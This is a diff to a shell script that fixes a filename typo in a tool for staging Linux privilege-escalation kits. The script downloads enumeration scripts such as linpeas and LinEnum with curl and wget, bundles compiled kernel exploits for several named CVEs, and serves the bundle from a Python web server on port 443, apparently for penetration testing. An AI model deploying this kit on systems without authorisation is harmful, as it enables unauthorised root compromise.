@@ -10,7 +10,7 @@ sudo cp /usr/share/unix-privesc-check/unix-privesc-check . && [ -f ./unix-prives
 # Download linpeas
 wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && [ -f ./linpeas.sh ] &&  (printf "[+] Downloaded linpeas.sh\n" && chmod +x linpeas.sh) || printf "[-] Download issue. linpeas.sh not downloaded\n"
 curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh > LinEnum.sh && [ -f ./LinEnum.sh ] &&  (printf "[+] Downloaded LinEnum.sh\n" && chmod +x LinEnum.sh) || printf "[-] Download issue. LinEnum.sh not downloaded\n"
-curl -s https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh > les.sh && [ -f ./les.sh ] &&  (printf "[+] Downloaded les.sh\n" && chmod +x lse.sh) || printf "[-] Download issue. les.sh not downloaded\n"
+curl -s https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh > les.sh && [ -f ./les.sh ] &&  (printf "[+] Downloaded les.sh\n" && chmod +x les.sh) || printf "[-] Download issue. les.sh not downloaded\n"
 curl -s https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py > linuxprivchecker.py && [ -f ./linuxprivchecker.py ] &&  (printf "[+] Downloaded linuxprivchecker.py\n" && chmod +x linuxprivchecker.py) || printf "[-] Download issue. linuxprivchecker.py not downloaded\n"
 
 # Kernel exploit dependencies
@@ -54,12 +54,12 @@ chmod +x ../CVE-2023-32233-exploit && cd ../ && rm -rf CVE-2023-32233
 
 
 # Package tools in lintools.zip
-tar -czvf lintools.tar.gz CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linuxprivchecker.py unix-privesc-check lse.sh LinEnum.sh linpeas.sh
+tar -czvf lintools.tar.gz CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linuxprivchecker.py unix-privesc-check les.sh LinEnum.sh linpeas.sh
 printf "[+] Created lintools.tar.gz package\n"
 
 # Clean up files
 printf "[+] Cleaning up files...\n"
-rm -rf CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linpeas.sh LinEnum.sh linuxprivchecker.py unix-privesc-check lse.sh
+rm -rf CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linpeas.sh LinEnum.sh linuxprivchecker.py unix-privesc-check les.sh
 
 # Start webserver
 printf "[+] Starting Python webserver on port 443\n"
